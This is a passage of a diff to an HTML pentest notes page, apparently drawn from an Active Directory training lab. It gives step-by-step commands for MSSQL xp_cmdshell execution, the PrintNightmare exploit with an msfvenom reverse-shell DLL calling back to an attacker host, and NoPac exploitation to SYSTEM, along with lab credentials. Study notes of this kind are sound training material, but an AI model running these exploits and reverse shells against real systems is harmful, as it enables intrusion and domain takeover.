+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4"></a><span class="c"># Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</span>
 </span></code></pre></div></td></tr></table></div>
  
 We can also authenticate from our Linux attack host using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a> from the Impacket toolkit.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-59-1">1</a></span>
-<span class="normal"><a href="#__codelineno-59-2">2</a></span>
-<span class="normal"><a href="#__codelineno-59-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1"></a>mssqlclient.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$ip</span><span class="w"> </span>-windows-auth
-</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2"></a><span class="c1"># Example:</span>
-</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3"></a><span class="c1"># mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-60-1">1</a></span>
+<span class="normal"><a href="#__codelineno-60-2">2</a></span>
+<span class="normal"><a href="#__codelineno-60-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1"></a>mssqlclient.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$ip</span><span class="w"> </span>-windows-auth
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2"></a><span class="c1"># Example:</span>
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3"></a><span class="c1"># mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span>
 </span></code></pre></div></td></tr></table></div>
 <p>We could then choose <code>enable_xp_cmdshell</code> to enable the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell stored procedure</a> which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-60-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1"></a>SQL&gt;<span class="w"> </span>enable_xp_cmdshell
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-61-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1"></a>SQL&gt;<span class="w"> </span>enable_xp_cmdshell
 </span></code></pre></div></td></tr></table></div>
 <p>Finally, we can run commands in the format <code>xp_cmdshell &lt;command&gt;</code>.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-61-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1"></a>xp_cmdshell<span class="w"> </span>whoami<span class="w"> </span>/priv
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-62-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1"></a>xp_cmdshell<span class="w"> </span>whoami<span class="w"> </span>/priv
 </span></code></pre></div></td></tr></table></div>
 <blockquote>
 <p>Finally, we can run commands in the format <code>xp_cmdshell &lt;command&gt;</code>. Here we can enumerate the rights that our user has on the system and see that we have <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a>, which can be leveraged in combination with a tool such as <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>, <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>, or <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> to escalate to <code>SYSTEM</code> level privileges, depending on the target host, and use this access to continue toward our goal.</p>
@@ -18595,72 +18650,72 @@ We can also authenticate from our Linux attack host using <a href="https://gith
 <h2 id="printnightmare">🖨️ PrintNightmare</h2>
 <p><code>PrintNightmare</code> is the nickname given to two vulnerabilities (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527</a> and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">CVE-2021-1675</a>) found in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc">Print Spooler service</a> that runs on all Windows operating systems.</p>
 <p>We will be using <a href="https://twitter.com/cube0x0?lang=en">cube0x0's</a> exploit.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-62-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/cube0x0/CVE-2021-1675.git
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-63-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/cube0x0/CVE-2021-1675.git
 </span></code></pre></div></td></tr></table></div>
 <p>For this exploit to work successfully, we will need to use cube0x0's version of Impacket:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-63-1">1</a></span>
-<span class="normal"><a href="#__codelineno-63-2">2</a></span>
-<span class="normal"><a href="#__codelineno-63-3">3</a></span>
-<span class="normal"><a href="#__codelineno-63-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1"></a>pip3<span class="w"> </span>uninstall<span class="w"> </span>impacket
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/cube0x0/impacket
-</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3"></a><span class="nb">cd</span><span class="w"> </span>impacket
-</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4"></a>python3<span class="w"> </span>./setup.py<span class="w"> </span>install
-</span></code></pre></div></td></tr></table></div>
-<p>Enumerating for MS-RPRN:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-64-1">1</a></span>
 <span class="normal"><a href="#__codelineno-64-2">2</a></span>
 <span class="normal"><a href="#__codelineno-64-3">3</a></span>
-<span class="normal"><a href="#__codelineno-64-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1"></a><span class="c1"># We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</span>
-</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2"></a>rpcdump.py<span class="w"> </span>@<span class="nv">$DomainControllerIP</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>egrep<span class="w"> </span><span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
-</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4"></a><span class="c1"># rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</span>
+<span class="normal"><a href="#__codelineno-64-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1"></a>pip3<span class="w"> </span>uninstall<span class="w"> </span>impacket
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/cube0x0/impacket
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3"></a><span class="nb">cd</span><span class="w"> </span>impacket
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4"></a>python3<span class="w"> </span>./setup.py<span class="w"> </span>install
 </span></code></pre></div></td></tr></table></div>
-<p>After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.</p>
+<p>Enumerating for MS-RPRN:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-65-1">1</a></span>
 <span class="normal"><a href="#__codelineno-65-2">2</a></span>
-<span class="normal"><a href="#__codelineno-65-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$IPhost</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">8080</span><span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$FileName</span>.dll
-</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2"></a><span class="c1"># Example:</span>
-</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3"></a><span class="c1"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</span>
+<span class="normal"><a href="#__codelineno-65-3">3</a></span>
+<span class="normal"><a href="#__codelineno-65-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1"></a><span class="c1"># We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</span>
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2"></a>rpcdump.py<span class="w"> </span>@<span class="nv">$DomainControllerIP</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>egrep<span class="w"> </span><span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
+</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4"></a><span class="c1"># rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</span>
 </span></code></pre></div></td></tr></table></div>
-<p>We will then host this payload in an SMB share we create on our attack host using smbserver.py.</p>
+<p>After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-66-1">1</a></span>
 <span class="normal"><a href="#__codelineno-66-2">2</a></span>
-<span class="normal"><a href="#__codelineno-66-3">3</a></span>
-<span class="normal"><a href="#__codelineno-66-4">4</a></span>
-<span class="normal"><a href="#__codelineno-66-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1"></a><span class="c1"># Creating a Share with smbserver.py</span>
-</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2"></a>sudo<span class="w"> </span>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span><span class="nv">$ShareName</span><span class="w"> </span>/path/to/<span class="nv">$FileName</span>.dll
-</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4"></a><span class="c1"># sudo smbserver.py -smb2support CompData /home/</span>
-</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5"></a><span class="c1"># This will leave our terminal in the host machine with no other use than that of sharing.</span>
+<span class="normal"><a href="#__codelineno-66-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$IPhost</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">8080</span><span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$FileName</span>.dll
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2"></a><span class="c1"># Example:</span>
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3"></a><span class="c1"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</span>
 </span></code></pre></div></td></tr></table></div>
-<p>Then we will need to open a two new terminals in our attacker machine:</p>
+<p>We will then host this payload in an SMB share we create on our attack host using smbserver.py.</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-67-1">1</a></span>
 <span class="normal"><a href="#__codelineno-67-2">2</a></span>
 <span class="normal"><a href="#__codelineno-67-3">3</a></span>
 <span class="normal"><a href="#__codelineno-67-4">4</a></span>
-<span class="normal"><a href="#__codelineno-67-5">5</a></span>
-<span class="normal"><a href="#__codelineno-67-6">6</a></span>
-<span class="normal"><a href="#__codelineno-67-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1"></a><span class="c1"># In the first terminal we will configure ant start a MSF multi/handler</span>
-</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2"></a>msfconsole<span class="w"> </span>-q
-</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3"></a>use<span class="w"> </span>exploit/multi/handler
-</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
-</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">172</span>.16.5.225
-</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">8080</span>
-</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7"></a>run
+<span class="normal"><a href="#__codelineno-67-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1"></a><span class="c1"># Creating a Share with smbserver.py</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2"></a>sudo<span class="w"> </span>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span><span class="nv">$ShareName</span><span class="w"> </span>/path/to/<span class="nv">$FileName</span>.dll
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4"></a><span class="c1"># sudo smbserver.py -smb2support CompData /home/</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5"></a><span class="c1"># This will leave our terminal in the host machine with no other use than that of sharing.</span>
 </span></code></pre></div></td></tr></table></div>
+<p>Then we will need to open a two new terminals in our attacker machine:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-68-1">1</a></span>
 <span class="normal"><a href="#__codelineno-68-2">2</a></span>
 <span class="normal"><a href="#__codelineno-68-3">3</a></span>
 <span class="normal"><a href="#__codelineno-68-4">4</a></span>
 <span class="normal"><a href="#__codelineno-68-5">5</a></span>
 <span class="normal"><a href="#__codelineno-68-6">6</a></span>
-<span class="normal"><a href="#__codelineno-68-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1"></a><span class="c1"># In the second terminal we will connect via ssh with the host machine:</span>
-</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2"></a>ssh<span class="w"> </span><span class="nv">$user</span>@<span class="nv">$ip</span>
-</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3"></a>
-</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4"></a><span class="c1"># Then we run the exploit:</span>
-</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/opt/CVE-2021-1675/CVE-2021-1675.py<span class="w"> </span><span class="nv">$user</span>/<span class="nv">$user</span>:<span class="nv">$password</span>@<span class="nv">$domainControllerIP</span><span class="w">  </span><span class="s1">&#39;\\$ipHostMachine\$ShareName\$filename.dll&#39;</span>
-</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6"></a><span class="c1"># Example:</span>
-</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7"></a><span class="c1"># sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#39;\\172.16.5.225\CompData\backupscript.dll&#39;</span>
+<span class="normal"><a href="#__codelineno-68-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1"></a><span class="c1"># In the first terminal we will configure ant start a MSF multi/handler</span>
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2"></a>msfconsole<span class="w"> </span>-q
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3"></a>use<span class="w"> </span>exploit/multi/handler
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/x64/meterpreter/reverse_tcp
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">172</span>.16.5.225
+</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">8080</span>
+</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7"></a>run
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-69-1">1</a></span>
+<span class="normal"><a href="#__codelineno-69-2">2</a></span>
+<span class="normal"><a href="#__codelineno-69-3">3</a></span>
+<span class="normal"><a href="#__codelineno-69-4">4</a></span>
+<span class="normal"><a href="#__codelineno-69-5">5</a></span>
+<span class="normal"><a href="#__codelineno-69-6">6</a></span>
+<span class="normal"><a href="#__codelineno-69-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1"></a><span class="c1"># In the second terminal we will connect via ssh with the host machine:</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2"></a>ssh<span class="w"> </span><span class="nv">$user</span>@<span class="nv">$ip</span>
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3"></a>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4"></a><span class="c1"># Then we run the exploit:</span>
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/opt/CVE-2021-1675/CVE-2021-1675.py<span class="w"> </span><span class="nv">$user</span>/<span class="nv">$user</span>:<span class="nv">$password</span>@<span class="nv">$domainControllerIP</span><span class="w">  </span><span class="s1">&#39;\\$ipHostMachine\$ShareName\$filename.dll&#39;</span>
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6"></a><span class="c1"># Example:</span>
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7"></a><span class="c1"># sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#39;\\172.16.5.225\CompData\backupscript.dll&#39;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>The payload will then call back to our multi handler giving us an elevated SYSTEM shell.</p>
 <h2 id="print-spooler">Print Spooler</h2>
@@ -18688,56 +18743,56 @@ We can also authenticate from our Linux attack host using <a href="https://gith
 </tr>
 </tbody>
 </table>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-69-1">1</a></span>
-<span class="normal"><a href="#__codelineno-69-2">2</a></span>
-<span class="normal"><a href="#__codelineno-69-3">3</a></span>
-<span class="normal"><a href="#__codelineno-69-4">4</a></span>
-<span class="normal"><a href="#__codelineno-69-5">5</a></span>
-<span class="normal"><a href="#__codelineno-69-6">6</a></span>
-<span class="normal"><a href="#__codelineno-69-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1"></a><span class="c1"># Ensuring Impacket is Installed</span>
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/SecureAuthCorp/impacket.git
-</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3"></a>
-</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4"></a>python<span class="w"> </span>setup.py<span class="w"> </span>install<span class="w"> </span>
-</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5"></a>
-</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6"></a><span class="c1"># Cloning the NoPac Exploit Repo</span>
-</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Ridter/noPac.git
-</span></code></pre></div></td></tr></table></div>
-<p>Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. </p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-70-1">1</a></span>
 <span class="normal"><a href="#__codelineno-70-2">2</a></span>
 <span class="normal"><a href="#__codelineno-70-3">3</a></span>
-<span class="normal"><a href="#__codelineno-70-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1"></a><span class="c1"># First we will scan:</span>
-</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>scanner.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccounName</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-use-ldap
-</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4"></a><span class="c1"># sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</span>
+<span class="normal"><a href="#__codelineno-70-4">4</a></span>
+<span class="normal"><a href="#__codelineno-70-5">5</a></span>
+<span class="normal"><a href="#__codelineno-70-6">6</a></span>
+<span class="normal"><a href="#__codelineno-70-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1"></a><span class="c1"># Ensuring Impacket is Installed</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/SecureAuthCorp/impacket.git
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3"></a>
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4"></a>python<span class="w"> </span>setup.py<span class="w"> </span>install<span class="w"> </span>
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5"></a>
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6"></a><span class="c1"># Cloning the NoPac Exploit Repo</span>
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Ridter/noPac.git
 </span></code></pre></div></td></tr></table></div>
-<p>We will obtain the <code>ms-DS-MachineAccountQuota</code> number. If it is set to 0, the attack will not work.</p>
+<p>Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. </p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-71-1">1</a></span>
 <span class="normal"><a href="#__codelineno-71-2">2</a></span>
 <span class="normal"><a href="#__codelineno-71-3">3</a></span>
-<span class="normal"><a href="#__codelineno-71-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1"></a><span class="c1"># Running NoPac &amp; Getting a semi-interactive shell session  using smbexec.py -https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py. This could be &quot;noisy&quot; or may be blocked by AV or EDR.</span>
-</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>-shell<span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap
-</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3"></a><span class="c1"># Example: </span>
-</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span>
+<span class="normal"><a href="#__codelineno-71-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1"></a><span class="c1"># First we will scan:</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>scanner.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccounName</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-use-ldap
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4"></a><span class="c1"># sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</span>
 </span></code></pre></div></td></tr></table></div>
-<p>Important: It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run (We can use <code>ls</code> to confirm).</p>
+<p>We will obtain the <code>ms-DS-MachineAccountQuota</code> number. If it is set to 0, the attack will not work.</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-72-1">1</a></span>
 <span class="normal"><a href="#__codelineno-72-2">2</a></span>
 <span class="normal"><a href="#__codelineno-72-3">3</a></span>
-<span class="normal"><a href="#__codelineno-72-4">4</a></span>
-<span class="normal"><a href="#__codelineno-72-5">5</a></span>
-<span class="normal"><a href="#__codelineno-72-6">6</a></span>
-<span class="normal"><a href="#__codelineno-72-7">7</a></span>
-<span class="normal"><a href="#__codelineno-72-8">8</a></span>
